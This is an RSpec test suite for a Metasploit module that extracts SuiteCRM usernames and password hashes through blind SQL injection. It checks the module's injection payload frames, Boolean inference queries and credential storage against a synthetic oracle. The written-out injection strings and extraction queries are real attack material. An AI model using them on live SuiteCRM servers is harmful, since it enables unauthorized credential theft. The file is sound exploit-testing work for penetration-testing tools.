require 'rspec'
require 'msfenv'
require 'msf/base'
require 'rex/ui/text/output/buffer'

RSpec.describe 'SuiteCRM username transport and blind inference' do
  subject(:mod) { owner_class.new }

  let(:owner_class) do
    scope = Module.new
    source = ENV.fetch('SUITECRM_NAMES_OWNER_SOURCE', File.expand_path('../../../../modules/auxiliary/gather/suite_crm_export_sqli.rb', __dir__))
    scope.module_eval(File.binread(source), source)
    scope.const_get(:MetasploitModule).tap do |klass|
      klass.include(Msf)
      klass.framework = framework
    end
  end
  let(:framework) { double('Framework', datastore: Msf::DataStore.new) }
  let(:requests) { [] }
  let(:conditions) { [] }
  let(:scalar) { "aé,o'neil" }
  let(:names) { ["aé,o'neil", 'labadmin'] }
  let(:always_false) { false }
  let(:aggregation_cap) { nil }
  let(:sqli) { mod.init_sqli }
  let(:password_hash) { '$2y$10$' + 'a' * 53 }

  before do
    mod.init_ui(nil, Rex::Ui::Text::Output::Buffer.new)
    mod.datastore['RHOSTS'] = '192.0.2.10'
    mod.datastore['RPORT'] = 80
    allow(mod).to receive(:create_credential)
    allow(mod).to receive(:myworkspace_id).and_return(7)
    # Finite synthetic SQL/HTTP oracle. Native run20261118T192820-6e2685
    # independently established aé,o'neil as a valid SuiteCRM7.12.5 username.
    allow(mod).to receive(:send_injection_request_cgi) do |payload|
      requests << payload
      raise 'Synthetic Boolean oracle exceeded 500 requests' if requests.length > 500

      truth = if payload == ',\\,))+AND+1=2;+--+'
                false
              else
                prefix = ',\\,))+OR+('
                raise ArgumentError, 'Unexpected synthetic injection frame' unless payload.start_with?(prefix) && payload.end_with?(');+--+')

                condition = payload.delete_prefix(prefix).delete_suffix(');+--+')
                conditions << condition
                !always_false && evaluate_condition(condition.tr('+', ' '))
              end
      Rex::Proto::Http::Response.new(200).tap { |response| response.body = truth ? 't' * 814 : 'f' * 572 }
    end
  end

  def scalar_for(query)
    return scalar if query == 'select fixture_scalar'

    if query.start_with?('select group_concat(')
      selected = names
      limit = query.match(/ limit (\d+)/)
      selected = selected.first(limit[1].to_i) if limit
      value = query.start_with?('select group_concat(hex(user_name)') ? selected.map { |name| name.unpack1('H*') }.join(',') : selected.join(',')
      return aggregation_cap ? value.byteslice(0, aggregation_cap) : value
    end
    if (selection = query.match(/from \(select distinct user_name from users order by user_name(?: limit (\d+))?\) suitecrm_users/))
      selected = selection[1] ? names.first(selection[1].to_i) : names
      return selected.compact.length.to_s if query.start_with?('select count(user_name)')

      offset = query.match(/ order by user_name limit 1 offset (\d+)\z/)
      return selected.compact.fetch(offset[1].to_i).unpack1('H*') if query.start_with?('select hex(user_name)') && offset
    end
    raise ArgumentError, 'Unexpected synthetic SQL query: ' + query
  end

  def encoded_transport(value)
    double('synthetic single encoded username').tap do |transport|
      allow(transport).to receive(:run_sql).and_return('1', value)
    end
  end

  def compare(value, operation, minimum, maximum)
    case operation
    when '=' then value == minimum.to_i
    when '>' then value > minimum.to_i
    when ' NOT BETWEEN 0 AND ' then !value.between?(0, minimum.to_i)
    when ' BETWEEN ' then value.between?(minimum.to_i, maximum.to_i)
    else raise ArgumentError, 'Unexpected synthetic comparison'
    end
  end

  def evaluate_condition(condition)
    if (match = condition.match(/\Alength\(cast\(\((.*)\) as binary\)\)(=|>| BETWEEN | NOT BETWEEN 0 AND )(-?\d+)(?: AND (-?\d+))?\z/))
      return compare(scalar_for(match[1]).bytesize, match[2], match[3], match[4])
    end

    if (match = condition.match(/\A\(select ascii\(substr\(\((.*)\) from (\d+) for 1\)\)\)(=| BETWEEN )(-?\d+)(?: AND (-?\d+))?\z/))
      character = scalar_for(match[1]).each_char.to_a[match[2].to_i - 1]
      return compare(character&.bytes&.first || 0, match[3], match[4], match[5])
    end
    if (match = condition.match(/\Aascii\(substr\(cast\(\((.*)\) as binary\) from (\d+) for 1\)\)(>| NOT BETWEEN 0 AND )(\d+)\z/))
      byte = scalar_for(match[1]).b.getbyte(match[2].to_i - 1) || 0
      return compare(byte, match[3], match[4], nil)
    end
    raise ArgumentError, 'Unexpected synthetic Boolean condition: ' + condition
  end

  it 'preserves the native comma, apostrophe and multibyte username as one UTF-8 name' do
    mod.datastore['COUNT'] = 1

    expect(mod.get_user_names(sqli)).to eq(["aé,o'neil"])
  end

  it 'returns usernames with valid UTF-8 encoding for credential persistence' do
    mod.datastore['COUNT'] = 1

    expect(mod.get_user_names(sqli).first.encoding).to eq(Encoding::UTF_8)
  end

  it 'preserves an embedded comma when more than one native name is returned' do
    mod.datastore['COUNT'] = 0

    expect(mod.get_user_names(sqli)).to eq(["aé,o'neil", 'labadmin'])
  end

  it 'keeps every generated inference condition comma-free' do
    mod.datastore['COUNT'] = 1
    mod.get_user_names(sqli)

    expect(conditions).not_to include(include(','))
  end

  it 'extracts actual scalar UTF-8 bytes without missing continuation bytes or a trailing NUL' do
    expect(sqli.run_sql('select fixture_scalar')).to eq("aé,o'neil".b)
  end

  [0, 1, 799, 800, 801, 1600].each do |length|
    context "with a synthetic scalar of #{length} bytes" do
      let(:scalar) { 'a' * length }

      it 'infers the exact length in a finite number of requests' do
        expect(sqli.send(:blind_detect_length, 'select fixture_scalar', false)).to eq(length)
      end
    end
  end

  context 'with binary byte boundaries' do
    let(:scalar) { [0, 127, 128, 255].pack('C*') }

    it 'retains NUL, DEL and high bytes in the SQLi scalar return' do
      expect(sqli.run_sql('select fixture_scalar')).to eq(scalar)
    end
  end

  context 'when the Boolean oracle consistently returns false' do
    let(:always_false) { true }

    it 'finishes with an empty result rather than looping' do
      expect(sqli.run_sql('select fixture_scalar')).to eq('')
    end
  end

  context 'with a malformed encoded username response' do
    let(:transport) { encoded_transport('61Z0') }

    it 'rejects corrupt hexadecimal data before collecting credentials' do
      expect { mod.get_user_names(transport) }.to raise_error(Msf::Auxiliary::Failed, /malformed hexadecimal/i)
    end
  end

  context 'with a trailing empty encoded username field' do
    let(:transport) { encoded_transport('61,') }

    it 'does not silently drop a malformed trailing field' do
      expect { mod.get_user_names(transport) }.to raise_error(Msf::Auxiliary::Failed, /malformed hexadecimal/i)
    end
  end

  context 'with a missing encoded username response' do
    let(:transport) { encoded_transport(nil) }

    it 'reports a missing extraction result as an expected module failure' do
      expect { mod.get_user_names(transport) }.to raise_error(Msf::Auxiliary::Failed, /username extraction/i)
    end
  end

  context 'with invalid UTF-8 in a decoded username' do
    let(:transport) { encoded_transport('C3') }

    it 'refuses invalid bytes before credential persistence' do
      expect { mod.get_user_names(transport) }.to raise_error(Msf::Auxiliary::Failed, /UTF-8/i)
    end
  end

  context 'with previously supported total username data below 800 raw bytes' do
    let(:names) { ['a' * 60, 'b' * 60, 'c' * 60, 'd' * 60, 'e' * 60, 'f' * 60, 'g' * 60, 'h' * 60, 'i' * 60, 'j' * 60, 'k' * 60, 'l' * 60] }
    let(:aggregation_cap) { 1024 }
    let(:transport) { mod.create_sqli(dbms: Msf::Exploit::SQLi::MySQLi::Common) { |query| scalar_for(query) } }

    it 'preserves all usernames without aggregation truncation' do
      mod.datastore['COUNT'] = 0

      expect(mod.get_user_names(transport)).to eq(names)
    end
  end

  context 'through the HTTP form and observed SuiteCRM HTML encoding' do
    let(:serialized_posts) { [] }

    before do
      allow(mod).to receive(:send_injection_request_cgi).and_call_original
      allow(mod).to receive(:send_request_cgi) do |options|
        request = Rex::Proto::Http::Client.new('192.0.2.10', 80).request_cgi(options)
        body = request.to_s.split("\r\n\r\n", 2).fetch(1)
        fields = URI.decode_www_form(body).to_h
        # Actual Rex serialization, then angle encoding observed in native SQL
        # errors. SQL evaluation and error response bodies remain synthetic.
        original = fields.fetch('uid')
        cleaned = original.gsub('<', '&lt;').gsub('>', '&gt;')
        serialized_posts << { original: original, cleaned: cleaned }
        raise 'Serialized Boolean oracle exceeded 500 requests' if serialized_posts.length > 500

        response = Rex::Proto::Http::Response.new(200)
        if cleaned.include?('&lt;') || cleaned.include?('&gt;')
          response.headers['Content-Type'] = 'text/html'
          response.body = 'Synthetic database error after SuiteCRM HTML encoding'
        elsif cleaned == ',\\,))+AND+1=2;+--+'.tr('+', ' ')
          response.headers['Content-Type'] = 'text/comma-separated-values; charset=UTF-8'
          response.body = 'f' * 572
        else
          prefix = ',\\,))+OR+('.tr('+', ' ')
          suffix = ');+--+'.tr('+', ' ')
          raise ArgumentError, 'Unexpected serialized injection frame' unless cleaned.start_with?(prefix) && cleaned.end_with?(suffix)

          truth = evaluate_condition(cleaned.delete_prefix(prefix).delete_suffix(suffix))
          response.headers['Content-Type'] = 'text/comma-separated-values; charset=UTF-8'
          response.body = truth ? 't' * 814 : 'f' * 572
        end
        response
      end
    end

    [0, 1, 1600].each do |length|
      context "with a serialized length predicate for #{length} bytes" do
        let(:scalar) { 'a' * length }

        it 'retains finite exact inference through the real request builder' do
          expect(sqli.send(:blind_detect_length, 'select fixture_scalar', false)).to eq(length)
        end
      end
    end

    it 'extracts UTF-8 bytes through the request builder and target escaping model' do
      expect(sqli.blind_dump_data('select fixture_scalar', scalar.bytesize, 0, 8, false)).to eq(scalar.b)
    end
  end

  context 'with an export response MIME type' do
    let(:response) { Rex::Proto::Http::Response.new(200).tap { |value| value.body = 'Synthetic export response' } }

    before do
      allow(mod).to receive(:send_injection_request_cgi).and_call_original
      allow(mod).to receive(:send_request_cgi).and_return(response)
    end

    it 'accepts the captured product CSV MIME with charset parameters' do
      response.headers['Content-Type'] = 'text/comma-separated-values; charset=UTF-8'

      expect(mod.send_injection_request_cgi('probe')).to equal(response)
    end

    it 'rejects an HTML error page before it can be mistaken for Boolean true' do
      response.headers['Content-Type'] = 'text/html; charset=UTF-8'

      expect { mod.send_injection_request_cgi('probe') }.to raise_error(Msf::Auxiliary::Failed, /did not return CSV/)
    end

    it 'rejects an untyped response before it can be mistaken for Boolean true' do
      expect { mod.send_injection_request_cgi('probe') }.to raise_error(Msf::Auxiliary::Failed, /did not return CSV/)
    end
  end

  it 'does not reinterpret arbitrary signed predicates as nonnegative comparisons' do
    response = Rex::Proto::Http::Response.new(200).tap { |value| value.body = 'f' * 572 }
    allow(mod).to receive(:send_injection_request_cgi).and_return(response)
    sqli.send(:blind_request, '-1>0')

    expect(mod).to have_received(:send_injection_request_cgi).with(',\\,))+OR+(-1>0);+--+')
  end

  describe 'hash lookup through the actual SQL string encoder' do
    let(:queries) { [] }
    let(:transport) do
      mod.create_sqli(dbms: Msf::Exploit::SQLi::MySQLi::Common, opts: { hex_encode_strings: true }) do |query|
        queries << query
        password_hash
      end
    end

    {
      "aé,o'neil" => '61c3a92c6f276e65696c',
      'comma,name' => '636f6d6d612c6e616d65',
      "o'neil" => '6f276e65696c',
      'élève' => 'c3a96cc3a87665',
      'viewer' => '766965776572'
    }.each do |username, hex|
      context "for #{username.inspect}" do
        it 'selects the exact binary username with comma-free valid SQL' do
          mod.get_user_hashes(transport, [username])

          expect(queries).to eq(['select user_hash from users where user_name=0x' + hex])
        end
      end
    end

    it 'keeps the successful helper return shape and credential username' do
      expect(mod.get_user_hashes(transport, ["aé,o'neil"])).to eq([["aé,o'neil", password_hash]])
    end

    it 'preserves the existing credential metadata' do
      mod.get_user_hashes(transport, ["aé,o'neil"])

      expect(mod).to have_received(:create_credential).with(hash_including(username: "aé,o'neil", private_data: password_hash, private_type: :nonreplayable_hash, jtr_format: 'bf', origin_type: :service, service_name: 'SuiteCRM', address: '192.0.2.10', port: 80, protocol: 'tcp', status: Metasploit::Model::Login::Status::UNTRIED))
    end
  end
end
